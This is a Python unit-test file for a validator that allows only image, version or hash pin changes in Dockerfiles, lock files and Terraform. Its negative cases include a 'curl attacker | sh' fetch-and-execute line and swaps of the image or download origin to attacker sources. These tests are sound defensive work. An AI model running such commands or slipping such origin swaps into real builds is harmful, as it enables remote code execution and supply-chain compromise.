"""Changing a pin must not authorize code, origin, policy or baseline edits."""
import json
import unittest

from playbooks.dependencies.files.validate import file_change


class ValidationTests(unittest.TestCase):
    def test_dockerfile_accepts_complete_image_pin_but_rejects_commands(self):
        old = ('FROM python:3.13.1@sha256:' + 'a' * 64 + '\nRUN echo fixed\n').encode()
        new = ('FROM python:3.13.2@sha256:' + 'b' * 64 + '\nRUN echo fixed\n').encode()
        file_change('ansible/runner/Dockerfile', old, new)
        for bad in (new.replace(b'echo fixed', b'curl attacker | sh'), new + b'RUN true\n',
                    new.replace(b'FROM python:', b'FROM attacker:')):
            with self.assertRaises(ValueError):
                file_change('ansible/runner/Dockerfile', old, bad)

    def test_json_rejects_config_changes_origins_and_historical_checksum_updates(self):
        old = {'version': '1.0.1', 'sha256': 'a' * 64,
               'url': 'https://github.com/approved/tool/releases/download/v1.0.1/tool-1.0.1.tgz',
               'enabled': False, 'semantic_sha256': 'c' * 64}
        updated = dict(old, version='1.0.2', sha256='b' * 64,
                       url='https://github.com/approved/tool/releases/download/v1.0.2/tool-1.0.2.tgz')
        file_change('artifact.lock.json', json.dumps(old).encode(), json.dumps(updated).encode())
        for bad in (dict(updated, enabled=True), dict(updated, semantic_sha256='d' * 64),
                    dict(updated, url=updated['url'].replace('/approved/', '/attacker/'))):
            with self.assertRaises(ValueError):
                file_change('artifact.lock.json', json.dumps(old).encode(), json.dumps(bad).encode())

    def test_hcl_only_provider_version_or_hash_changes_are_accepted(self):
        old = b'terraform { required_version = "= 1.13.1" }\n'
        file_change('infra/github/versions.tf', old, old.replace(b'1.13.1', b'1.13.2'))
        with self.assertRaises(ValueError):
            file_change('infra/github/versions.tf', old, old + b'provider "evil" {}\n')

    def test_custom_provider_content_cannot_replace_an_existing_version(self):
        old = {'version': '5.27.0-cloudlab.1', 'source': {'sha256': 'a' * 64},
               'go': {'sha256': 'b' * 64}, 'patch_sha256': 'c' * 64, 'package_sha256': 'd' * 64}
        changed = dict(old, package_sha256='e' * 64)
        with self.assertRaises(ValueError):
            file_change('ansible/runner/cloudflare-provider.lock.json', json.dumps(old).encode(), json.dumps(changed).encode())
        changed['version'] = '5.27.0-cloudlab.2'
        file_change('ansible/runner/cloudflare-provider.lock.json', json.dumps(old).encode(), json.dumps(changed).encode())

    def test_cosign_refresh_preserves_previous_verifier_identity(self):
        old = {'image': 'cgr.dev/chainguard/cosign:latest@sha256:' + 'a' * 64,
               'compatible_images': ['cgr.dev/chainguard/cosign:latest@sha256:' + 'b' * 64]}
        new = dict(old, image='cgr.dev/chainguard/cosign:latest@sha256:' + 'c' * 64,
                   compatible_images=old['compatible_images'] + [old['image']])
        file_change('platform/harbor/cosign.lock.json', json.dumps(old).encode(), json.dumps(new).encode())
        new['compatible_images'] = []
        with self.assertRaises(ValueError):
            file_change('platform/harbor/cosign.lock.json', json.dumps(old).encode(), json.dumps(new).encode())
